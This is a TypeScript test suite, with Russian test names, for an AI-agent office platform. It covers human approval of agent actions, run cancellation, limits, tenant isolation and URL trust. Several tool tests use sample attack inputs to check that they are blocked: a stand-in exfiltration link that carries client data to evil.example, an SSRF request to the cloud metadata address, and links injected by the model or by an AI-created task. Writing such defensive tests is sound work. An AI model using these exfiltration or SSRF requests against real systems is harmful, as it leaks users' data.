import { afterAll, beforeEach, describe, expect, it, vi } from "vitest";
import { as, call, company } from "./helpers";
import { and, eq, sql } from "drizzle-orm";
import { closeDb, schema, systemDb, tenant } from "@/server/db/client";
import { currentAuth } from "@/server/security/session";
import { anthropicProvider, type StepResult } from "@/server/agent/providers";
import { claimRun, lastCallIds, processRun } from "@/server/agent/runner";
import { drainRuns, tick } from "@/server/agent/worker";
import { execute, prepareCall, toolDefs, urlsIn, type ToolContext } from "@/server/agent/tools";
import * as demo from "@/app/api/auth/demo/route";
import * as staffRoute from "@/app/api/staff/route";
import * as staffOne from "@/app/api/staff/[id]/route";
import * as chat from "@/app/api/staff/[id]/chat/route";
import * as approvalsRoute from "@/app/api/approvals/route";
import * as approvalOne from "@/app/api/approvals/[id]/route";
import * as cancel from "@/app/api/runs/[id]/cancel/route";
import * as connRoute from "@/app/api/connections/route";
import * as contactsRoute from "@/app/api/contacts/route";
import * as tasksRoute from "@/app/api/tasks/route";
import * as taskOne from "@/app/api/tasks/[id]/route";
import * as overviewRoute from "@/app/api/overview/route";
import * as monitorsRoute from "@/app/api/monitors/route";

afterAll(closeDb);

const step = (o: Partial<StepResult> & { tools?: [string, Record<string, unknown>][] } = {}): StepResult => {
  const calls = (o.tools ?? []).map(([name, input]) => ({ id: `c_${crypto.randomUUID()}`, name, input }));
  return { append: { role: "assistant", content: calls.map((c) => ({ type: "tool_use", ...c })) }, text: o.text ?? "", calls, stop: calls.length ? "tool" : "end", tokensIn: 10, tokensOut: 5, ...o };
};
/** Подменяем только обращение к модели: остальной путь настоящий. */
const script = (...s: StepResult[]) => {
  const spy = vi.spyOn(anthropicProvider, "step");
  s.forEach((x) => spy.mockResolvedValueOnce(x));
  return spy;
};
beforeEach(async () => {
  vi.restoreAllMocks();
  await (await systemDb()).update(schema.runs).set({ status: "cancelled" }).where(sql`status in ('queued', 'running')`);
});

async function office(autonomy: "ask" | "auto" = "ask") {
  const c = await company();
  await call(connRoute.POST, { body: { provider: "anthropic", label: "Claude", key: "sk-test-1234567890", model: "claude-opus-5-5" } });
  const s = (await call(staffRoute.POST, { body: { template: "sales", name: "Вера", avatar: "Business_Female_01" } })).data.id as string;
  if (autonomy === "auto") await call(staffOne.PATCH, { method: "PATCH", body: { autonomy }, params: { id: s } });
  return { c, s, org: c.auth.orgId };
}
const say = (id: string, text = "Сделай") => call(chat.POST, { body: { text }, params: { id } });
const contactsCount = async (org: string) => (await tenant(org, (tx) => tx.select().from(schema.contacts))).length;
const lastRun = async (org: string) => (await tenant(org, (tx) => tx.select().from(schema.runs).orderBy(sql`created_at desc`).limit(1)))[0];
const pending = async () => ((await call(approvalsRoute.GET)).data as { id: string; status: string }[]).filter((x) => x.status === "pending");
const NEW: [string, Record<string, unknown>] = ["save_contact", { name: "Новый", company: "", email: "", phone: "", notes: "" }];

describe("одобрения", () => {
  it("без решения человека ничего не меняется, после одобрения — ровно один раз", async () => {
    const { s, org } = await office();
    script(step({ tools: [NEW] }), step({ text: "Добавил" }));
    expect((await say(s)).status).toBe(200);
    await drainRuns(1);
    expect((await lastRun(org)).status).toBe("waiting");
    expect(await contactsCount(org)).toBe(0);
    const [p] = await pending();
    const both = await Promise.all([1, 2].map(() => call(approvalOne.POST, { body: { approve: true }, params: { id: p.id } })));
    expect(both.map((r) => r.status).sort()).toEqual([200, 409]);
    await drainRuns(3);
    expect(await contactsCount(org)).toBe(1);
    expect((await lastRun(org)).status).toBe("succeeded");
    expect((await call(chat.GET, { params: { id: s } })).data.messages.at(-1).text).toBe("Добавил");
  });

  it("отклонение доходит до модели с комментарием", async () => {
    const { s, org } = await office();
    const spy = script(step({ tools: [NEW] }), step({ text: "Понял" }));
    await say(s);
    await drainRuns(1);
    const [p] = await pending();
    await call(approvalOne.POST, { body: { approve: false, comment: "не тот клиент" }, params: { id: p.id } });
    await drainRuns(1);
    expect(await contactsCount(org)).toBe(0);
    expect(JSON.stringify(spy.mock.calls[1][0].transcript)).toContain("не тот клиент");
  });

  it("два действия за шаг ждут оба решения, смешанные результаты идут по порядку", async () => {
    const { s, org } = await office();
    const spy = script(step({ tools: [NEW, ["search_contacts", { query: "" }], ["save_contact", { ...NEW[1], name: "Второй" }]] }), step({ text: "ок" }));
    await say(s);
    await drainRuns(1);
    const list = await pending();
    expect(list).toHaveLength(2);
    await call(approvalOne.POST, { body: { approve: true }, params: { id: list[0].id } });
    await drainRuns(1);
    expect((await lastRun(org)).status).toBe("waiting");
    await call(approvalOne.POST, { body: { approve: false }, params: { id: list[1].id } });
    await drainRuns(1);
    expect((await lastRun(org)).status).toBe("succeeded");
    expect(await contactsCount(org)).toBe(1);
    const results = (spy.mock.calls[1][0].transcript.at(-1) as { content: { is_error: boolean }[] }).content;
    expect(results).toHaveLength(3);
    expect(results.filter((r) => r.is_error)).toHaveLength(1);
  });

  it("чужая компания не может одобрить", async () => {
    const { s } = await office();
    script(step({ tools: [NEW] }));
    await say(s);
    await drainRuns(1);
    const [p] = await pending();
    const other = await company();
    as(other);
    expect((await call(approvalOne.POST, { body: { approve: true }, params: { id: p.id } })).status).toBe(404);
  });

  it("отмена работы отзывает ожидающие действия", async () => {
    const { s, org } = await office();
    script(step({ tools: [NEW] }));
    await say(s);
    await drainRuns(1);
    const [p] = await pending();
    const run = await lastRun(org);
    expect((await call(cancel.POST, { body: {}, params: { id: run.id } })).status).toBe(200);
    expect((await call(approvalOne.POST, { body: { approve: true }, params: { id: p.id } })).status).toBe(409);
    await drainRuns(2);
    expect(await contactsCount(org)).toBe(0);
  });

  it("если право забрали, пока действие ждало, оно не выполнится", async () => {
    const { s, org } = await office();
    script(step({ tools: [NEW] }), step({ text: "ок" }));
    await say(s);
    await drainRuns(1);
    await call(staffOne.PATCH, { method: "PATCH", body: { tools: ["search_contacts"] }, params: { id: s } });
    const [p] = await pending();
    await call(approvalOne.POST, { body: { approve: true }, params: { id: p.id } });
    await drainRuns(1);
    expect(await contactsCount(org)).toBe(0);
  });
});

describe("самостоятельный режим", () => {
  it("действие выполняется один раз и после сбоя процесса", async () => {
    const { s, org } = await office("auto");
    const spy = script(step({ tools: [NEW] }));
    spy.mockRejectedValueOnce(new Error("процесс упал"));
    await say(s);
    const claimed = (await claimRun())!;
    // обрыв сразу после действия: второй запрос к модели не удался
    await processRun(claimed.orgId, claimed.id);
    expect(await contactsCount(org)).toBe(1);
    // возвращаем работу в состояние «исполнитель исчез»
    await tenant(org, (tx) => tx.update(schema.runs).set({ status: "running", lockedUntil: new Date(0) }).where(eq(schema.runs.id, claimed.id)));
    script(step({ text: "Готово" }));
    await drainRuns(1);
    expect(await contactsCount(org)).toBe(1);
    expect((await lastRun(org)).status).toBe("succeeded");
  });

  it("перехваченная работа: прежний исполнитель больше ничего не пишет", async () => {
    const { s, org } = await office("auto");
    await say(s);
    const claimed = (await claimRun())!;
    const spy = vi.spyOn(anthropicProvider, "step");
    spy.mockImplementationOnce(async () => {
      await tenant(org, (tx) => tx.update(schema.runs).set({ attempts: 5 }).where(eq(schema.runs.id, claimed.id)));
      return step({ tools: [NEW] });
    });
    await processRun(claimed.orgId, claimed.id);
    expect(await contactsCount(org)).toBe(0);
  });

  it("бесконечный цикл останавливается", async () => {
    const { s, org } = await office("auto");
    vi.spyOn(anthropicProvider, "step").mockImplementation(async () => step({ tools: [["search_contacts", { query: "" }]] }));
    await say(s);
    await drainRuns(1);
    const r = await lastRun(org);
    expect(r.status).toBe("failed");
    expect(r.steps).toBeLessThanOrEqual(12);
  });

  it("дневной лимит запусков соблюдается", async () => {
    const { s } = await office();
    await call(staffOne.PATCH, { method: "PATCH", body: { dailyRunLimit: 2 }, params: { id: s } });
    expect((await say(s)).status).toBe(200);
    expect((await say(s)).status).toBe(200);
    expect((await say(s)).status).toBe(409);
  });
});

describe("инструменты", () => {
  const ctx = (o: Partial<ToolContext> = {}): ToolContext => ({ orgId: crypto.randomUUID(), staffId: crypto.randomUUID(), staffName: "Т", demo: false, trustedText: "", seenUrls: new Set(), ...o });

  it("модель не может вызвать неразрешённое или с кривыми данными", () => {
    expect(prepareCall("save_contact", NEW[1], ["search_contacts"]).ok).toBe(false);
    expect(prepareCall("constructor", {}, ["constructor"]).ok).toBe(false);
    expect(prepareCall("move_deal", { deal_id: "1", stage: "won", reason: "x" }, ["move_deal"]).ok).toBe(false);
    expect(toolDefs(["save_contact", "__proto__", "нет"]).map((t) => t.name)).toEqual(["save_contact"]);
  });

  it("нельзя открыть адрес, которого не давал человек: утечка данных через ссылку закрыта", async () => {
    const c = ctx({ trustedText: "Посмотри https://example.com/tariffs, пожалуйста" });
    await expect(execute("read_web_page", { url: "https://evil.example/?d=klienty" }, c)).rejects.toThrow(/не давал/);
    await expect(execute("read_web_page", { url: "https://example.com/tariffs?leak=1" }, c)).rejects.toThrow(/не давал/);
    await expect(execute("read_web_page", { url: "http://169.254.169.254/" }, ctx({ trustedText: "http://169.254.169.254/" }))).rejects.toThrow(/Внутренние/);
    expect(urlsIn(c.trustedText)).toEqual(["https://example.com/tariffs"]);
  });

  it("ответ самого сотрудника и задача от ИИ не делают ссылку доверенной", async () => {
    const { s, org } = await office();
    script(step({ text: "Загляните на https://evil.example/leak" }), step({ text: "ок" }));
    await say(s, "Привет");
    await drainRuns(1);
    await say(s, "А теперь открой https://good.example/a");
    const r = await lastRun(org);
    expect(r.prompt).toContain("evil.example");
    expect(r.trusted).not.toContain("evil.example");
    expect(r.trusted).toContain("good.example");
    const [t] = await tenant(org, (tx) => tx.insert(schema.tasks).values({ orgId: org, assigneeId: s, title: "https://evil.example/x", createdBy: "ИИ", byAi: true }).returning());
    await call(taskOne.POST, { body: { action: "start" }, params: { id: t.id } });
    const [tr] = await tenant(org, (tx) => tx.select().from(schema.runs).where(eq(schema.runs.taskId, t.id)));
    expect(tr.trusted).not.toContain("evil");
  });

  it("задача, созданная ИИ, сама не запускается", async () => {
    const { s, org } = await office("auto");
    script(step({ tools: [["create_task", { title: "Ещё работа", brief: "", assignee: "" }]] }), step({ text: "ок" }));
    await say(s);
    await drainRuns(1);
    const [t] = await tenant(org, (tx) => tx.select().from(schema.tasks).where(eq(schema.tasks.title, "Ещё работа")));
    expect([t.status, t.byAi]).toEqual(["todo", true]);
  });

  it("все форматы провайдеров возвращают id вызовов", () => {
    expect(lastCallIds([{ role: "assistant", content: [{ type: "text" }, { type: "tool_use", id: "a" }] }])).toEqual(["a"]);
    expect(lastCallIds([{ role: "assistant", tool_calls: [{ id: "b" }] }])).toEqual(["b"]);
    expect(lastCallIds([{ role: "assistant", callIds: ["c"] }])).toEqual(["c"]);
    expect(lastCallIds([{ role: "user", content: "x" }])).toEqual([]);
  });
});

describe("задачи", () => {
  it("ИИ выполняет, результат ждёт проверки, человек принимает", async () => {
    const { s } = await office();
    script(step({ text: "Отчёт готов" }));
    const t = (await call(tasksRoute.POST, { body: { title: "Отчёт", assigneeId: s, start: true } })).data.id;
    await drainRuns(1);
    const get = async () => (await call(tasksRoute.GET)).data.find((x: { id: string }) => x.id === t);
    expect(await get()).toMatchObject({ status: "review", result: "Отчёт готов" });
    expect((await call(taskOne.POST, { body: { action: "accept" }, params: { id: t } })).status).toBe(200);
    expect((await get()).status).toBe("done");
    expect((await call(taskOne.POST, { body: { action: "accept" }, params: { id: t } })).status).toBe(409);
  });
});

describe("демо", () => {
  it("каждый гость получает свою компанию, без сети и ключей; одобрение доводит работу до конца", async () => {
    const { jar } = await import("./helpers");
    jar.clear();
    expect((await call(demo.POST, { body: {} })).status).toBe(200);
    const one = (await currentAuth())!;
    const token = jar.get("session")!;
    jar.clear();
    await call(demo.POST, { body: {} });
    expect((await currentAuth())!.orgId).not.toBe(one.orgId);
    as({ cookie: token });
    expect((await call(connRoute.POST, { body: { provider: "anthropic", label: "x", key: "sk-12345678", model: "m" } })).status).toBe(403);
    const list = (await call(staffRoute.GET)).data as { id: string; kind: string; name: string }[];
    const mon = list.find((x) => x.name === "Глеб")!;
    expect((await call(monitorsRoute.POST, { body: { staffId: mon.id, name: "x", url: "example.com", everyMin: 5 } })).status).toBe(403);
    expect((await call(monitorsRoute.GET)).data[0].total).toBeGreaterThan(10);
    expect((await call(overviewRoute.GET)).data.pending).toBe(2);
    const [p] = await pending();
    expect((await call(approvalOne.POST, { body: { approve: true }, params: { id: p.id } })).status).toBe(200);
    await drainRuns(2);
    expect((await call(overviewRoute.GET)).data.pending).toBe(1);
    const done = await tenant(one.orgId, (tx) => tx.select().from(schema.approvals).where(eq(schema.approvals.id, p.id)));
    expect(done[0].status).toBe("executed");
    const run = await tenant(one.orgId, (tx) => tx.select().from(schema.runs).where(eq(schema.runs.id, done[0].runId)));
    expect(run[0].status).toBe("succeeded");
  });

  it("просроченная демо-компания недоступна и удаляется вместе с данными", async () => {
    const { jar } = await import("./helpers");
    jar.clear();
    await call(demo.POST, { body: {} });
    const x = (await currentAuth())!;
    const db = await systemDb();
    await db.update(schema.organizations).set({ demoExpiresAt: new Date(0) }).where(eq(schema.organizations.id, x.orgId));
    expect(await currentAuth()).toBeNull();
    await tick();
    expect(await db.select().from(schema.organizations).where(eq(schema.organizations.id, x.orgId))).toHaveLength(0);
    expect(await db.select().from(schema.staff).where(eq(schema.staff.orgId, x.orgId))).toHaveLength(0);
    expect(await db.select().from(schema.users).where(eq(schema.users.id, x.userId))).toHaveLength(0);
  });
});

it("одна компания не занимает всю очередь", async () => {
  const x = await office();
  for (let i = 0; i < 5; i++) await say(x.s);
  for (let i = 0; i < 3; i++) expect((await claimRun())!.orgId).toBe(x.org);
  expect(await claimRun()).toBeNull();
  const y = await office();
  await say(y.s);
  expect((await claimRun())!.orgId).toBe(y.org);
});

it("расписание ставит работу один раз за период", async () => {
  const { s, org } = await office();
  await call(staffOne.PATCH, { method: "PATCH", body: { scheduleEveryMin: 60, schedulePrompt: "Отчитайся" }, params: { id: s } });
  await tenant(org, (tx) => tx.update(schema.staff).set({ nextRunAt: new Date(0) }).where(eq(schema.staff.id, s)));
  script(step({ text: "Отчёт" }));
  await tick();
  await tick();
  const list = await tenant(org, (tx) => tx.select().from(schema.runs).where(and(eq(schema.runs.staffId, s), eq(schema.runs.trigger, "schedule"))));
  expect(list).toHaveLength(1);
  expect(list[0].status).toBe("succeeded");
  void contactsRoute;
});
